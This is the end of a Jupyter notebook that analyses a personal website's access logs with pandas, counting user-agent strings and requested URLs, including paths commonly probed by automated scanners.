      "python-requests/2.3.0 CPython/2.7.3 Linux/3.2.0-4-amd64                                                                                                                                                           1\n",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36                                                                            1\n",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7) Gecko/20101111 Firefox/4.0b7                                                                                                                                        1\n",
      "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 920) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537       1\n",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5                                                                                                                          1\n",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36                                                                                          1\n",
      "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36                                                                                                            1\n",
      "Mozilla/5.0 (Windows; U; Win98; cs-CZ; rv:1.7.5) Gecko/20041108 Firefox/1.0                                                                                                                                       1\n",
      "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11                                                                                                       1\n",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_1) AppleWebkit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1                                                                                             1\n",
      "Opera/9.61 (X11; Linux i686; U; en) Presto/2.1.1                                                                                                                                                                  1\n",
      "LinqiaCrawlerBot/1.0 (eng@linqia.com)                                                                                                                                                                             1\n",
      "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 ips-agent                                                                                                                           1\n",
      "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7                                                                                                                1\n",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2                                                                                               1\n",
      "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16                                                                                 1\n",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/9.0.571.0 Safari/534.12 ZipZap 3.1                                                                                  1\n",
      "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36                                                                                           1\n",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; Maxthon 2.0)                                                                                                                               1\n",
      "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0                                                                                                                                                 1\n",
      "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.700.3 Safari/534.24                                                                                                               1\n",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko)                                                                                                                           1\n",
      "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36                                                                                                              1\n",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36                                                                                          1\n",
      "Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; Transformer TF101 Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30                                                                     1\n",
      "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)                                                                                                                                           1\n",
      "Name: UserAgent, Length: 1383, dtype: int64\n"
     ]
    }
   ],
   "source": [
    "# count user agents\n",
    "agents = all_logs_df['UserAgent'].value_counts()\n",
    "print(agents)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1383"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(agents)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/                                                                                 8837\n",
      "/robots.txt                                                                       5845\n",
      "/ramble/index.php?blogId=54                                                        876\n",
      "/favicon.ico                                                                       735\n",
      "/ramble/index.php?blogId=53                                                        492\n",
      "/ramble/index.php?blogId=50                                                        492\n",
      "http://51.254.206.142/httptest.php                                                 357\n",
      "/wp-login.php                                                                      254\n",
      "/hamster.gif                                                                       253\n",
      "/ramble/index.php?blogId=91                                                        236\n",
      "/phone_pix/cat.jpg                                                                 233\n",
      "/ramble/index.php?blogId=5                                                         195\n",
      "/photos/black_fleet/wookie.jpg                                                     149\n",
      "/photos/black_fleet/YodaClaus.jpg                                                  143\n",
      "/ramble/index.php?blogId=57                                                        139\n",
      "/ramble/index.php                                                                  122\n",
      "/ramble/index.php?blogId=12                                                        114\n",
      "/ramble/index.php?blogId=30                                                         95\n",
      "/ramble/index.php?blogId=7                                                          90\n",
      "/admin.php                                                                          90\n",
      "/ramble/index.php?blogId=92                                                         90\n",
      "/manager/html                                                                       88\n",
      "/administrator/index.php                                                            81\n",
      "/album/2001/6-june-24/justin_bruise.jpg                                             71\n",
      "/tmUnblock.cgi                                                                      70\n",
      "/muieblackcat                                                                       69\n",
      "//myadmin/scripts/setup.php                                                         63\n",
      "//phpmyadmin/scripts/setup.php                                                      62\n",
      "/ramble/index.php?blogId=4                                                          61\n",
      "/ramble/index.php?blogId=39                                                         60\n",
      "                                                                                  ... \n",
      "/ramble/index.php?blogid=24                                                          1\n",
      "/invoker/readonly/JMXInvokerServlet                                                  1\n",
      "/elim_contents/photos/jackal%2Dknife2.jpg                                            1\n",
      "/elim_contents/my_photos/.thumb_metoday.jpg                                          1\n",
      "/css/css                                                                             1\n",
      "/index.php?action=logout                                                             1\n",
      "/elim_contents/old_modeling/working_portfolio/.thumb_Mae_sig_mug.jpg                 1\n",
      "/sqlite/SQLite-manager/main.php                                                      1\n",
      "//database/comersus.mdb                                                              1\n",
      "/elim_contents/album.old/album/5000/.thumb_IMG_8523.JPG                              1\n",
      "/elim_contents/zoran_took_photos/.thumb_hair.jpg                                     1\n",
      "/elim_contents/album.old/album/5000/.thumb_IMG_8597.JPG                              1\n",
      "/elim_contents/old_modeling/non_working_portfolio/20050514/.thumb_DSC_0042.JPG       1\n",
      "/elim_contents/boot_camp/PyPoll/failed.py                                            1\n",
      "/elim_contents/old_modeling/non_working_portfolio/20050514/.thumb_DSC_0011.JPG       1\n",
      "/girl_in_green/thumbs/big_bonzai-thmb.jpg                                            1\n",
      "/photos/als/                                                                         1\n",
      "/+comersus/database/comersus.mdb                                                     1\n",
      "/?action=showcalendar                                                                1\n",
      "/elim_contents/old_modeling/working_portfolio/.thumb_mae10022.JPG                    1\n",
      "/elim_contents/zoran_took_photos/28.html                                             1\n",
      "/elim_contents/photos/index.html                                                     1\n",
      "/RPC                                                                                 1\n",
      "/elim_contents/my_photos/.thumb_chain4_sm.jpg                                        1\n",
      "//phpMyAdmin-2.6.1-pl2/scripts/setup.php                                             1\n",
      "/javascripts/                                                                        1\n",
      "/SQLiteManager-1.1.1/main.php                                                        1\n",
      "/elim_contents/old_modeling/working_portfolio/.thumb_mae10023.JPG                    1\n",
      "/userAction_loginUI.action                                                           1\n",
      "/elim_contents/zoran_took_photos/1.html                                              1\n",
      "Name: URL, Length: 3488, dtype: int64\n"
     ]
    }
   ],
   "source": [
    "url_requested = all_logs_df['URL'].value_counts()\n",
    "print(url_requested)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
